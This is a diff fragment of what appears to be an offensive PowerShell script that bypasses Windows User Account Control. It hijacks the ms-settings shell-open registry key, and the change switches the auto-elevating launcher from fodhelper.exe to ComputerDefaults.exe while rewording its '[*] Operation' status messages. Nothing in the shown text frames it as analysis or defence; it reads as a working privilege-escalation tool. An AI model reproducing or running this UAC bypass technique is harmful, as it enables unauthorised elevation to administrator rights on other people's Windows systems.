@@ -40,14 +40,14 @@ Add First Value Execute:>  reg add HKLM\SOFTWARE\Classes\ms-settings\Shell\Open\
     sleep 1
     Write-Host ""
     Write-Host ""
-    Write-Host -Object "[*] Operation THE Executeion in Location Ex Program " -ForegroundColor Yellow
+    Write-Host -Object "[*] Operation UAC Access in Location " -ForegroundColor Yellow
     sleep 1
     Write-Host ""
     Write-Host ""
-    Write-Host -Object "[*] Operation Access in Storage Program FR SYS" -ForegroundColor Yellow
+    Write-Host -Object "[*] Operation Access in Storage Program" -ForegroundColor Yellow
    
-     $EnableAccessStorage = fodhelper.exe /RegServer
-     $AccessAgain = fodhelper.exe /open
+     $EnableAccessStorage = ComputerDefaults.exe  /RegServer
+     $AccessAgain = ComputerDefaults.exe  /open
 } 
 
 }
